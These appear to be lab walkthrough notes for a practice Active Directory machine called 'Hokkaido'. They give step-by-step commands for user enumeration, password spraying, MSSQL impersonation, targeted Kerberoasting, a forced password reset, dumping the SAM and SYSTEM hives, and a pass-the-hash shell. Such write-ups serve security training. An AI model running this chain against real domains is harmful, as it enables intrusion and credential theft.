# Hokkaido: Machine Notes

## Recon

### Nmap
- **AD Ports**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3389, 5985
- **Domain**: `hokkaido-aerospace.com`
- **Host**: `DC01`

### User Enumeration (Kerbrute)
- **Tool**: `kerbrute userenum`
- **Execution**:
  ```bash
  kerbrute userenum -d hokkaido-aerospace.com --dc 10.10.10.10 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
  ```
- **Found Users**: `info`, `administrator`, `discovery`, `maintenance`.

### Initial Foothold (Password Spraying)
- **Targeted Wordlist**: Created using seasons (`Winter2023`, etc.) and username variations/reversals (`ofni`).
- **Discovery**: Found `info:info`.
- **Finding Creds**: Found `password_reset.txt` in `\\10.10.10.10\NETLOGON\temp\`.
- **New Creds**: `discovery:Start123!`

---

## Pivoting & Lateral Movement

### MSSQL Impersonation
1. **Login**:
   ```bash
   impacket-mssqlclient 'hokkaido-aerospace.com/discovery':'Start123!'@10.10.10.10 -windows-auth
   ```
2. **Find Impersonatable Users**:
   ```sql
   SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
   ```
3. **Execute Impersonation**:
   ```sql
   EXECUTE AS LOGIN = 'hrappdb-reader'
   ```
4. **Result**: Able to access `hrappdb` and find credentials: `hrapp-service:Untimed$Runny`.

### Targeted Kerberoasting
1. **Rights Discovery** (BloodHound):
   `hrapp-service` has **GenericWrite** on `Hazel.Green`.
2. **Execution**:
   ```bash
   python3 targetedKerberoast.py -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 10.10.10.10
   ```
3. **Cracking**: Obtained password `haze1988`.

### RPC Password Change
- `Hazel.Green` has permissions to reset `MOLLY.SMITH`'s password.
- **Action**:
  ```bash
  rpcclient -U 'hokkaido-aerospace.com/hazel.green%haze1988' 10.10.10.10
  setuserinfo2 MOLLY.SMITH 23 'Password123!'
  ```

---

## Privilege Escalation

### SeBackupPrivilege (SAM/SYSTEM)
1. **Check Privs**: `whoami /priv` shows `SeBackupPrivilege`.
2. **Execution**:
   ```powershell
   reg save hklm\sam c:\Temp\sam
   reg save hklm\system c:\Temp\system
   ```
3. **Cracking**: Download hives and use `secretsdump`:
   ```bash
   impacket-secretsdump -system system -sam sam LOCAL
   ```
4. **Result**: `Administrator` NT hash.
5. **Shell**: `evil-winrm -i 10.10.10.10 -u administrator -H [NTHASH]`
